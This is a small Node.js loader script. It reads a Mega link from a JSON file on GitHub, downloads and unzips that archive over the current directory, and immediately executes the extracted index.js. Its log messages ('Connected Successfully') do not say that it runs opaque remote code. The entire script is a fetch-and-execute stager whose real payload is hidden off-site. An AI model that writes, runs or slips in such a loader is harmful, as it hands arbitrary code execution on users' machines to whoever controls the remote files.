const fs = require('fs');
const path = require("path");
const { File } = require("megajs");
const AdmZip = require("adm-zip");
const axios = require("axios");

const downloadAndExtractMegaZip = async (megaLink) => {
  try {
    console.log("Downloading Files...");
    const megaFile = await File.fromURL(megaLink);
    const currentDirectory = process.cwd();
    const zipFilePath = path.join(currentDirectory, "temp.zip");

    const fileBuffer = await new Promise((resolve, reject) => {
      megaFile.download((error, data) => {
        if (error) reject(error);
        else resolve(data);
      });
    });

    fs.writeFileSync(zipFilePath, fileBuffer);
    const zip = new AdmZip(zipFilePath);
    zip.extractAllTo(currentDirectory, true);
    fs.unlinkSync(zipFilePath);

    console.log("Connected Successfully ✅");
  } catch (err) {
    throw err;
  }
};

const main = async () => {
  try {
    console.log("Fetching Zaynix data...");
    const response = await axios.get(
      "https://raw.githubusercontent.com/pakaya112/pakaya/refs/heads/main/detals.json"
    );
    
    const { zip } = response.data;
    if (!zip) {
      throw new Error("Mega link not found in JSON under 'zip' key.");
    }

    console.log("Downloading and extracting files...");
    await downloadAndExtractMegaZip(zip);

    console.log("Executing...");
    require("./index.js");
  } catch (error) {
    console.error("An error occurred:", error);
  }
};

main();
